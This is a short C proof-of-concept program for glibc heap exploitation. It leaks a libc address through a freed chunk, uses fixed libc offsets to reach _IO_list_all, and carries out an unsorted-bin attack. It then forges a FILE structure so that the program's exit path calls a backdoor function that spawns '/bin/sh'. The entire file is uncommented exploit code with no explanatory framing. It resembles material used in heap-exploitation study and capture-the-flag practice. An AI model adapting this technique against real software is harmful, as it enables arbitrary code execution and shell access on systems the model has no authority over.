#include<stdio.h>
#include<stdlib.h>
#include<string.h>

void backdoor(){
    system("/bin/sh");
}

int main(){
    char *a=malloc(0x400);
    malloc(0x20);
    free(a);
    void *libc=(*(size_t*)a)-0x3c4b78;
    fprintf(stderr,"libc: %p\n",libc);
    size_t *io_list_all=0x3c5520+libc;
    malloc(0x400-0x60);
    size_t *pad=malloc(0x80);
    malloc(0x80);
    // unsortbin attack
    free(pad);
    pad[0]=0;
    pad[1]=(char*)(io_list_all)-0x10;
    
    // init chunk
    char* fake_iofile=a+0x3b0-0x10;
    // *(size_t*)fake_iofile=0;
    // *(size_t*)(fake_iofile+0x28)=0;
    *(size_t*)(fake_iofile+0x28)=1;
    *(size_t*)(fake_iofile+0x20)=0;
    *(size_t*)(fake_iofile+0xd8)=pad;

    pad[3]=backdoor;

    malloc(0x80);
    exit(0);
}
